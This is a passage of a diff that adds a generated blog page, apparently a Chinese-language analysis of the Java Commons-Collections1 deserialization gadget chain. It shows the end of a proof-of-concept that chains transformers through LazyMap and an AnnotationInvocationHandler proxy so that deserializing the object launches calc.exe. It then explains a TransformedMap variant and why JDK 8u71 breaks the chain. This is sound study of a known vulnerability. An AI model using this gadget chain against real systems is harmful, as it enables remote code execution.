+                        <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]</span> <span class="p">{</span> <span class="nx">String</span><span class="p">.</span><span class="nx">class</span> <span class="p">},</span> <span class="nx">new</span> <span class="nx">String</span><span class="p">[]{</span><span class="s">&#34;calc.exe&#34;</span><span class="p">}),</span>
+                <span class="nx">new</span> <span class="nf">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">};</span>
+
+        <span class="nx">Transformer</span> <span class="nx">transformerChain1</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ChainedTransformer</span><span class="p">(</span><span class="nx">transformers</span><span class="p">);</span>
+
+        <span class="nx">Map</span> <span class="nx">innerMap</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">HashMap</span><span class="p">();</span>
+
+        <span class="nx">Map</span> <span class="nx">lazyMap</span> <span class="p">=</span> <span class="nx">LazyMap</span><span class="p">.</span><span class="nf">decorate</span><span class="p">(</span><span class="nx">innerMap</span><span class="p">,</span> <span class="nx">transformerChain1</span><span class="p">);</span>
+
+        <span class="nx">Class</span> <span class="nx">clazz</span> <span class="p">=</span> <span class="nx">Class</span><span class="p">.</span><span class="nf">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span>
+
+        <span class="nx">Constructor</span> <span class="nx">constructor</span> <span class="p">=</span> <span class="nx">clazz</span><span class="p">.</span><span class="nf">getDeclaredConstructor</span><span class="p">(</span><span class="nx">Class</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Map</span><span class="p">.</span><span class="nx">class</span><span class="p">);</span>
+
+        <span class="nx">constructor</span><span class="p">.</span><span class="nf">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+
+        <span class="nx">InvocationHandler</span> <span class="nx">handler</span> <span class="p">=</span> <span class="p">(</span><span class="nx">InvocationHandler</span><span class="p">)</span> <span class="nx">constructor</span><span class="p">.</span><span class="nf">newInstance</span><span class="p">(</span><span class="nx">Retention</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">lazyMap</span><span class="p">);</span>
+
+        <span class="nx">Map</span> <span class="nx">proxyMap</span> <span class="p">=</span> <span class="p">(</span><span class="nx">Map</span><span class="p">)</span> <span class="nx">Proxy</span><span class="p">.</span><span class="nf">newProxyInstance</span><span class="p">(</span><span class="nx">Map</span><span class="p">.</span><span class="nx">class</span><span class="p">.</span><span class="nf">getClassLoader</span><span class="p">(),</span><span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">Map</span><span class="p">.</span><span class="nx">class</span><span class="p">},</span> <span class="nx">handler</span><span class="p">);</span>
+
+        <span class="nx">handler</span> <span class="p">=</span> <span class="p">(</span><span class="nx">InvocationHandler</span><span class="p">)</span> <span class="nx">constructor</span><span class="p">.</span><span class="nf">newInstance</span><span class="p">(</span><span class="nx">Retention</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">proxyMap</span><span class="p">);</span>
+
+        <span class="nx">ByteArrayOutputStream</span> <span class="nx">barr</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ByteArrayOutputStream</span><span class="p">();</span>
+        <span class="nx">ObjectOutputStream</span> <span class="nx">oos</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectOutputStream</span><span class="p">(</span><span class="nx">barr</span><span class="p">);</span>
+        <span class="nx">oos</span><span class="p">.</span><span class="nf">writeObject</span><span class="p">(</span><span class="nx">handler</span><span class="p">);</span>
+        <span class="nx">oos</span><span class="p">.</span><span class="nb">close</span><span class="p">();</span>
+
+        <span class="nx">ObjectInputStream</span> <span class="nx">in</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectInputStream</span><span class="p">(</span><span class="nx">new</span> <span class="nf">ByteArrayInputStream</span><span class="p">(</span><span class="nx">barr</span><span class="p">.</span><span class="nf">toByteArray</span><span class="p">()));</span>
+        <span class="nx">Object</span> <span class="nx">o</span> <span class="p">=</span> <span class="p">(</span><span class="nx">Object</span><span class="p">)</span> <span class="nx">in</span><span class="p">.</span><span class="nf">readObject</span><span class="p">();</span>
+
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>那么Commons-Collections1的分析就完成了</p>
+<h2 id="transformedmap的gadget">TransformedMap的gadget</h2>
+<p>网上搜cc1的文章时，还有一条链出现的频率非常高， 相对于ysoserial的LazyMap，它用到了TransformedMap。它的触发方式甚至比LazyMap的还要简单一点，
+因为它可以直接在AnnotationInvocationHandler的readObject方法中触发， 感兴趣的可以在网上搜一下。</p>
+<h2 id="jdk8u71之后版本不可用的原因">jdk8u71之后版本不可用的原因</h2>
+<p><img src="../img_11.png" alt="img_11.png"></p>
+<p>readObject方法新定义了一个LinkedHashMap， 之后更是将this.memberValues的值也设为了这个LinkedHashMap， 我们传进来的LazyMap已经不会再进到invoke函数了，整条gadget也就失效了。</p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">ssspallow</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-12-01
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/java/">java</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/jackson%E5%92%8Cjava%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%92%8Cjava%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">jackson和java原生反序列化</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/urldns/urldns/">
+            <span class="next-text nav-default">urldns</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://www.nomuggle.com/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2016 - 
+    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>ssspallow</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
